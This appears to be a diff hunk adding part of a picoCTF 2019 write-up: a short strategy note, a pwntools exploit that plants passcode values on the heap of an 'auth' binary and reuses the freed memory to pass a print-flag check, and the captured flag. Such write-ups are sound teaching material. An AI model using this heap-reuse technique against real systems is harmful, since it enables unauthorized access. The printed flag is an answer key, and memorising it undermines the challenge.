@@ -147,3 +147,57 @@ int main(int argc, char **argv) {
 ```
 </details>
 
+Our strategy here will be to hardcode ac1 and ac2 into our python script for later use. buffer our username with some trash then add ac1 and ac2 to it. Then we will logout and login again in order to stack another username onto the heap which will make print-flag check for ac1 and ac2 in the right spot
+
+<details>
+  <summary>exploit</summary>
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+import sys
+
+context.log_level = "critical"
+
+argv = sys.argv
+
+ac1 = 0x4343415f544f4f52 #passcode
+ac2 = 0x45444f435f535345 #passcode2
+
+if len(argv) > 1:
+  print "Running remotely"
+  p = remote('2019shell1.picoctf.com', 45173)
+else:
+  print "Running locally"
+  p = process('./auth')
+
+def login(user):
+  p.sendlineafter('Enter your command:', 'login')
+  p.sendlineafter('length of your username', str(len(user)+1))
+  p.sendlineafter('enter your username', user)
+
+def logout():
+  p.sendlineafter('Enter your command:', 'logout')
+
+def printflag():
+  p.sendlineafter('Enter your command:', 'print-flag')
+
+payload = ''
+payload+= 'A'*8   #buffer where the next username will be stored
+payload+= p64(ac1)  #first 4 of the pass ode
+payload+= p64(ac2)  #second 4 off the passcode
+
+login(payload)    #store passcode on the heap
+logout()      #clear login
+login('trash')    #fill the extra heap so print-flag will check the passcodes
+printflag() 
+p.interactive()
+```
+</details>
+
+<details>
+  <summary>Flag</summary>
+
+picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8e26e065}
+</details>
